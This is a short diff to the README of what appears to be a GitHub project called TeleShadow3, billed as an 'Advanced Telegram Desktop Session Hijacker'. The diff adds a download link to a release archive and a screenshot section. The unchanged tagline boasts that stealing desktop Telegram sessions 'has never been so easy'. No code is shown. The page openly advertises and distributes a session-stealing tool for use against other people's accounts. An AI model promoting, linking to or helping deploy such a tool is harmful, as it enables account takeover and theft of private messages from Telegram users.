@@ -1,5 +1,10 @@
 # TeleShadow3
 Teleshadow3- Advanced Telegram Desktop Session Hijacker!
+
+# Download
+Click [gere](https://github.com/EternalC0der/TeleShadow3/releases/download/3.0.0/Teleshadow.3.rar) to download version 3.0
+
+# Screenshot
 ![alt text](https://raw.githubusercontent.com/EternalC0der/TeleShadow3/master/Screen.png) 
 
 # Stealing desktop telegrams has never been so easy !
